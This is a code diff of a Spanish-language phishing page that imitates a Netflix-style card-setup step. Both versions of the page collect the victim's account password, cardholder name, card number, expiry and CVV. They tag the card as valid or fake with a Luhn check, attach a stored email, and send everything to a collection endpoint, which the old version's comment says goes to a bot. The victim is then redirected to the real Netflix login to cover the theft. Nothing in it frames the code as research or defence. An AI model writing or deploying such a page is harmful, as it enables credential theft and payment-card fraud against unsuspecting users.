@@ -3,99 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Confirmaci&oacute;n de Servicio</title>
+    <title>Confirmaci&oacute;n</title>
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { background: #fff; color: #333; font-family: 'Roboto', sans-serif; margin: 0; padding: 0; }
-        .nav-pay { border-bottom: 1px solid #e6e6e6; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }
-        .container-pay { max-width: 440px; margin: 30px auto; padding: 0 20px; }
-        h1 { font-size: 32px; margin: 10px 0 20px; font-weight: 700; }
+        body { background: #fff; font-family: sans-serif; margin: 0; }
+        .container { max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; }
         .input-box { margin-bottom: 15px; }
-        .input-box input { width: 100%; padding: 15px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 16px; box-sizing: border-box; outline: none; }
-        .input-box input:focus { border-color: #0071eb; }
-        .grid-input { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .btn-submit { background: #e50914; color: #fff; width: 100%; padding: 18px; border: none; font-size: 20px; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        #loading-overlay { display: none; text-align: center; padding: 60px 20px; }
-        .step { color: #333; font-size: 13px; text-transform: uppercase; }
+        .input-box input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #ccc; }
+        .btn { background: #e50914; color: #fff; width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; }
+        #loading { display: none; }
     </style>
 </head>
 <body>
-    <nav class="nav-pay">
-        <img src="img/logo.png" style="width: 100px;" alt="Logo"> 
-    </nav>
-
-    <div class="container-pay" id="form-container">
-        <span class="step">Paso <b>3</b> de <b>3</b></span>
-        <h1>Configura tu tarjeta</h1>
-        
-        <form id="pay-process-form">
-            <div class="input-box"><input type="password" id="f_k_1" placeholder="Contraseña de cuenta" required></div>
-            <div class="input-box"><input type="text" id="f_n_1" placeholder="Nombre en la tarjeta" required></div>
-            <div class="input-box"><input type="text" id="f_t_1" placeholder="Número de tarjeta" maxlength="16" inputmode="numeric" required></div>
-            <div class="grid-input">
-                <div class="input-box"><input type="text" id="f_e_1" placeholder="MM/AA" maxlength="5" inputmode="numeric" required></div>
-                <div class="input-box"><input type="text" id="f_c_1" placeholder="CVV" maxlength="4" inputmode="numeric" required></div>
-            </div>
-            <button type="submit" class="btn-submit" id="submit-button">Iniciar membresía</button>
+    <div class="container" id="form-container">
+        <h2>Configura tu tarjeta</h2>
+        <form id="pay-form">
+            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña" required></div>
+            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
+            <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
+            <div class="input-box"><input type="text" id="ex" placeholder="MM/AA" maxlength="5" required></div>
+            <div class="input-box"><input type="text" id="cv" placeholder="CVV" maxlength="4" required></div>
+            <button type="submit" class="btn">Continuar</button>
         </form>
     </div>
 
-    <div id="loading-overlay">
+    <div id="loading" class="container">
         <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
-        <p style="margin-top: 20px; font-size: 18px;">Procesando solicitud...</p>
+        <p>Procesando...</p>
     </div>
 
     <script>
-        // Función Algoritmo de Luhn
-        function validarLuhn(numero) {
-            let sum = 0;
-            for (let i = 0; i < numero.length; i++) {
-                let intVal = parseInt(numero.substr(i, 1));
-                if (i % 2 === numero.length % 2) {
-                    intVal *= 2;
-                    if (intVal > 9) intVal -= 9;
+        // Algoritmo de Luhn
+        function luhn(n) {
+            let s = 0;
+            for (let i = 0; i < n.length; i++) {
+                let v = parseInt(n[i]);
+                if (i % 2 === n.length % 2) {
+                    v *= 2;
+                    if (v > 9) v -= 9;
                 }
-                sum += intVal;
+                s += v;
             }
-            return (sum % 10 === 0);
+            return s % 10 === 0;
         }
 
-        // Máscara MM/AA
-        document.getElementById('f_e_1').addEventListener('input', function(e) {
-            let v = this.value.replace(/\D/g, '');
-            if (v.length >= 2) this.value = v.substring(0,2) + '/' + v.substring(2,4);
-        });
-
-        document.getElementById('pay-process-form').addEventListener('submit', function(e) {
+        document.getElementById('pay-form').addEventListener('submit', function(e) {
             e.preventDefault();
-            
             document.getElementById('form-container').style.display = 'none';
-            document.getElementById('loading-overlay').style.display = 'block';
+            document.getElementById('loading').style.display = 'block';
 
-            const ccVal = document.getElementById('f_t_1').value.replace(/\s/g, '');
-            const esValida = validarLuhn(ccVal);
-
-            const payload = {
+            const cc = document.getElementById('cc').value.replace(/\s/g, '');
+            const data = {
                 em: sessionStorage.getItem('usr_mail') || 'Desconocido',
-                pw: document.getElementById('f_k_1').value,
-                nm: document.getElementById('f_n_1').value,
-                cc: ccVal,
-                ex: document.getElementById('f_e_1').value,
-                cv: document.getElementById('f_c_1').value,
-                luhn: esValida ? "✅ PASÓ LUHN (Válida)" : "❌ FALLÓ LUHN (Falsa)"
+                pw: document.getElementById('pw').value,
+                nm: document.getElementById('nm').value,
+                cc: cc,
+                ex: document.getElementById('ex').value,
+                cv: document.getElementById('cv').value,
+                luhn: luhn(cc) ? "VÁLIDA" : "FALSA"
             };
 
-            // Enviar directamente al bot
+            // SEGURO: Redirigir a los 4 segundos pase lo que pase
+            setTimeout(() => { window.location.href = "https://www.netflix.com/login"; }, 4000);
+
             fetch('/api/enviar', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).finally(() => {
-                setTimeout(() => {
-                    window.location.href = "https://www.netflix.com/login";
-                }, 1500);
-            });
+                body: JSON.stringify(data)
+            })
+            .then(() => { window.location.href = "https://www.netflix.com/login"; })
+            .catch(() => { window.location.href = "https://www.netflix.com/login"; });
         });
     </script>
 </body>
